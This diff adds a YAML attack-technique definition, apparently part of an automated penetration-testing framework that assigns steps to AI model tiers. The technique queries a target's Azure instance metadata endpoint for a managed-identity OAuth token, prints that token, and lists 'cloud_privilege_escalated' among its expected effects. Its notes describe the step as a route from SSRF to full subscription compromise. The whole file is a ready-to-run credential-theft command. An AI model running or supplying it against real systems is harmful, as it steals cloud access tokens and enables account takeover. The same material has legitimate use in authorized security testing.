@@ -1,0 +1,45 @@
+name: azure_managed_identity
+category: cloud
+description: Query Azure IMDS for managed identity access token from inside an Azure VM
+preconditions:
+- service.port==80
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: >
+  curl -s --connect-timeout 5
+    -H "Metadata:true"
+    "http://{target_ip}/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+    2>&1 | python3 -c "
+  import json, sys
+  try:
+      d = json.loads(sys.stdin.read())
+      tok = d.get('access_token','')
+      if tok:
+          print(f'MANAGED_IDENTITY_TOKEN_OBTAINED')
+          print(f'token_type: {d.get(\"token_type\")}')
+          print(f'expires_in: {d.get(\"expires_in\")}')
+          print(f'resource: {d.get(\"resource\")}')
+          print(f'access_token: {tok[:60]}...')
+      else:
+          print(json.dumps(d, indent=2))
+  except Exception as e:
+      print(sys.stdin.read())
+  "
+parser: json_parser
+expected_effects:
+- azure_managed_identity_token_obtained
+- cloud.azure_token_available
+- cloud_privilege_escalated
+falsifier:
+  pattern: Connection refused|timed out|404|identity not found
+  timeout: 10
+model_tier: haiku
+mechanism: >
+  Azure IMDS at 169.254.169.254 (or internally resolvable) returns OAuth2 tokens for
+  the VM's managed identity. The Metadata:true header is required to prevent SSRF abuse
+  from non-VM origins. Token grants access to Azure management API, Key Vault, Storage,
+  or other resources depending on the identity's RBAC assignments. From SSRF this is
+  often the path to full Azure subscription compromise.
+hacktricks_ref: cloud-security/azure-security/az-azure-vm-security.md
+destructive: false
+opsec: low
